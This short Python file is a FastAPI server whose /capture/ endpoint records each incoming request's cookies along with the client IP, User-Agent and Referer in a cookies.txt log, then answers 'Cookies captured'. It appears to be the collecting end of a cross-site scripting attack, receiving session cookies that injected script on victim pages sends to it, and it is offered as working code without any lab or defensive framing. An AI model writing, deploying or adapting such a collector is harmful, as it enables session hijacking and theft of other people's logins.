#uvicorn main:app --reload

from fastapi import FastAPI, Request
from datetime import datetime

app = FastAPI()

@app.get("/capture/")
async def capture_cookies(request: Request):
    cookies = request.cookies  # Accessing all cookies from the request
    with open('cookies.txt', 'a') as cookie_file:
        time_str = datetime.now().strftime("%Y/%m/%d %H:%M:%S")
        client_host = request.client.host
        user_agent = request.headers.get("User-Agent")
        referer = request.headers.get("Referer", "No referer")  # Handling possible missing referer
        # Log each cookie
        for key, value in cookies.items():
            cookie_file.write(f'[+] Date: {time_str}\n[+] IP: {client_host}\n[+] UserAgent: {user_agent}\n[+] Referer: {referer}\n[+] Cookie: {key}={value}\n---\n')
    return {"status": "Cookies captured"}

